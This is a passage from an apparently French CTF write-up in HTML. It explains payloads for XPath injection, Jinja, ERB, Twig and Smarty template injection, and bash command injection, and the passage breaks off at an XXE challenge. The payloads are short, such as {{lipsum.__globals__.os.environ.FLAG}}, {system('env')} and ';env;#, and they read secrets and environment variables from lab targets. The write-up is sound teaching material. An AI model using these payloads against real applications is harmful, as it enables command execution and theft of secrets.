+  <a href="#xpath-injection" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Pour ce challenge, un petit XML nous est présenté :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="line"><span class="cl"><span class="nt">&lt;db&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;users&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;name&gt;</span>admin<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;password&gt;</span>FLAG<span class="nt">&lt;/password&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;name&gt;</span>guest<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;password&gt;</span>123456<span class="nt">&lt;/password&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/user&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/users&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/db&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Un requête XPath est effectuée sur ce XML comme suit :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//user[name/text()=&#34;guest&#34; and password/text()=&#34;$INPUT&#34;]/name/text()</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cette requête par défaut récupère le nom de l&rsquo;utilisateur où <code>name = &quot;guest&quot;</code> et où <code>password = &lt;NOTRE PAYLOAD&gt;</code>.
+Cependant, le flag se trouve dans le <strong>mot de passe</strong> de l&rsquo;utilisateur <em>admin</em>&hellip; On ne peux pas se contenter d&rsquo;ajouter des condition à la requête.
+Notre objectif est donc de sortir de la <em>string</em>, puis de la requête initiale, et d&rsquo;ajouter notre propre requête aux résultats afin d&rsquo;aller récupérer le mot de passe.</p>
+<p>Voici la payload que j&rsquo;ai utilisé :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;] | //user[ 1=1 ]/password/text() | //user[ 1=&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On peut voir que l&rsquo;on sort de la requête initiale <code>&quot;]</code> que l&rsquo;on rajoute une requête qui récupère tous les <em>password</em> <code>| //user[ 1=1 ]/password/text()</code> puis que l&rsquo;on rend la requête valide <code>| //user[ 1=&quot;</code></p>
+<h2 class="heading-element" id="jinja-ssti"><span>Jinja SSTI</span>
+  <a href="#jinja-ssti" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Nous avons là un code python utilisa jinja2 sur notre payload :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">template</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;PAYLOAD&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmpl</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">tmpl</span><span class="o">.</span><span class="n">render</span><span class="p">())</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notre payload est apparemment interprétée telle quelle en jinja2.</p>
+<p>L&rsquo;objectif ici est de lire la variable d&rsquo;environnement <code>FLAG</code>.
+Le plus simple, à mon avis, étant d&rsquo;accéder au module <code>os</code> afin d&rsquo;accéder à <code>os.environ</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Petite explication : <code>lipsum</code> est un builtins de jinja2. En tant que builtins il a accès directement à <code>__globals__</code> où tous les modules importés sont présent.
+Dans notre cas, <code>os</code> est importé dans le code fourni, mais il se trouve aussi dans le code importé de jinja2 <code>Environment</code>. Donc même sans cela nous pouvions y avoir accès.</p>
+<h2 class="heading-element" id="brainfuck"><span>Brainfuck</span>
+  <a href="#brainfuck" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Nous arrivons sur un challenge un peu moins &ldquo;banal&rdquo;, qui a peut-être fait peur à beaucoup au premier abord.
+L&rsquo;objectif est de lire, en brainfuck (un langage ésothérique), le flag séparé en 2 partie.</p>
+<p>La première partie est située à l&rsquo;adresse 0, la seconde partie se trouve sur le stdin.</p>
+<p>Si le brainfuck peut sembler peu simple d&rsquo;accès il l&rsquo;est moins pour nos amis les LLM comme Claude ou ChatGPT.
+Et je ne dois pas me cacher, je leur ai demandé comment faire pour avoir à moins réfléchir (le soleil tape fort en ce moment et une surchauffe est vite arrivée).</p>
+<p>Donc avant toute explication voici la payload :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-brainfuck" data-lang="brainfuck"><span class="line"><span class="cl"><span class="k">[</span><span class="nt">.</span><span class="nv">&gt;</span><span class="k">]</span><span class="nt">,</span><span class="k">[</span><span class="nt">.,</span><span class="k">]</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Je vais d&rsquo;abord expliquer les caractères :</p>
+<ul>
+<li><code>.</code> : le point sert à afficher ce qui est à l&rsquo;adresse actuelle (1 octet à la fois)</li>
+<li><code>&gt;</code> : le chevron sert à se déplacer d&rsquo;adresse en adresse, dans notre cas à aller à l&rsquo;adresse suivante</li>
+<li><code>,</code> : la virgule lit la valeur de stdin et la stocke à l&rsquo;adresse actuelle (1 octet à la fois)</li>
+<li><code>[]</code> : les crochets permettent de faire une boucle jusqu&rsquo;à ce que la valeur à notre adresse en sortie de boucle soit nulle ( <code>0</code> )</li>
+</ul>
+<p>On commence donc par une première boucle <code>[.&gt;]</code> qui va lire tous les caractères à partir de l&rsquo;adresse actuelle (l&rsquo;adresse 0), jusqu&rsquo;à ce qu&rsquo;une valeure nulle soit présente. Avec ça nous avons la première partie du flag.
+Ensuite nous avons une première virgule <code>,</code> pour mettre le 1ère octet de stdin à notre adresse actuelle. Puis il faut l&rsquo;afficher et récupérer la valeur suivante jusqu&rsquo;à ce qu&rsquo;on ai tout lu (donc jusqu&rsquo;à une valeur nulle) : <code>[.&gt;]</code></p>
+<p>Tout ça pour dire que le langage peut faire peur mais que l&rsquo;exercice en lui même était plutôt simple.</p>
+<h2 class="heading-element" id="erb-ssti"><span>ERB SSTI</span>
+  <a href="#erb-ssti" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On a une seconde SSTI, ici en Ruby avec ERB.
+Comme la précédente, il nous faut lire la variable d&rsquo;environnement <code>FLAG</code> et on nous donne le code</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;erb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">PAYLOAD</span> <span class="o">=</span> <span class="no">ENV</span><span class="o">[</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="o">]</span> <span class="o">||</span> <span class="s1">&#39;Payload&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Render and output</span>
+</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">PAYLOAD</span><span class="p">)</span><span class="o">.</span><span class="n">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">output</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>ERB intègre directement un moyen de lire les variables d&rsquo;environnement, on va faire simple</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%= ENV[&#39;FLAG&#39;] %&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="twig-ssti"><span>Twig SSTI</span>
+  <a href="#twig-ssti" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Encore une SSTI (et c&rsquo;est pas fini !), cette fois basée en PHP avec Twig, et encore une fois il faut lire la variable d&rsquo;environnement.</p>
+<p>Voici le code :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/vendor/autoload.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">TwigLoaderArrayLoader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">TwigEnvironment</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$PAYLOAD</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">&#39;Payload&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayLoader</span><span class="p">([</span><span class="s1">&#39;index&#39;</span> <span class="o">=&gt;</span> <span class="nv">$PAYLOAD</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span>   <span class="o">=</span> <span class="k">new</span> <span class="nx">Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;sandbox&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">[]);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici le code nous fait une petite farce. On peut voir <code>'sandbox' =&gt; true</code>.
+Cependant, il s&rsquo;agit juste d&rsquo;une variable nommé <code>sandbox</code> qui est set à <code>true</code>, donc il n&rsquo;y a aucune sandbox en place.
+Donc, on va faire une payload simple pour twig.</p>
+<p>Déjà, il n&rsquo;est pas simple en pur twig d&rsquo;aller lire une variable d&rsquo;environnement précise. On va donc faire une attaque &ldquo;simple&rdquo; : une exécution de commande.
+Celle-ci nous permettra d&rsquo;exécuter la commande <code>env</code> qui va afficher toutes les variables d&rsquo;environnement, dont <code>FLAG</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s1">&#39;env&#39;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Super, ça fonctionne tout seul.</p>
+<h2 class="heading-element" id="smarty-ssti"><span>Smarty SSTI</span>
+  <a href="#smarty-ssti" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Et la dernière SSTI !
+Elle est en Smarty, donc aussi PHP.</p>
+<p>On ne va pas tergiverser, voici le code :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/vendor/autoload.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$PAYLOAD</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">&#39;Hello, World!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$smarty</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Smarty</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$smarty</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="s1">&#39;eval:&#39;</span> <span class="o">.</span> <span class="nv">$PAYLOAD</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le code va juste executer notre payload, en twig, donc encore une fois il nous suffit d&rsquo;avoir une payload simple.
+Twig intègre les fonctions PHP de bases, donc <code>system</code>, on va encore une fois exécuter <code>env</code> directement.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;env&#39;</span><span class="p">)}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le challenge est passé !</p>
+<h2 class="heading-element" id="bash"><span>Bash</span>
+  <a href="#bash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On sort encore une fois du web pour une injection de commande en bash.
+Notre payload est injectée dans la commande suivante :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping -c <span class="m">1</span> <span class="s1">&#39;$INPUT&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici, le fait que la payload soit entre simple quote (<code>'</code>) nous empêche d&rsquo;utiliser les substitutions de commandes <code>$()</code> ou <code>\</code>``. Donc il faut sortir de la string et exécuter une nouvelle commande.
+Il faut cependant faire attention à ce que la ligne de commande complète soit valide. Pour cela on peut rouvrir une quote, ou commenter la fin de la ligne. Je vais personnellement choisir la seconde option.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="p">;</span>env<span class="p">;</span><span class="c1">#</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Avec ça, pas d&rsquo;erreur et une payload qui passe</p>
+<h2 class="heading-element" id="xxe"><span>XXE</span>
+  <a href="#xxe" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Pour le 12ème challenge on nous propose une vulnérabilité XXE.
+Nous devons lire le fichier <code>/dev/shm/flag.txt</code> en profitant d&rsquo;un parsing XML de notre payload.</p>
+<p>Voici le code du challenge :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xml</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;PAYLOAD&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">XMLParser</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">load_dtd</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">no_network</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resolve_entities</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recover</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">doc</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">xml</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">doc</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et notre payload est uniquement préfixé d&rsquo;une ligne :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Donc notre payload constitue la quasi totalité du XML, sans avoir à sortir d&rsquo;une balise ou échapper quoi que ce soit (quel bonheur).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
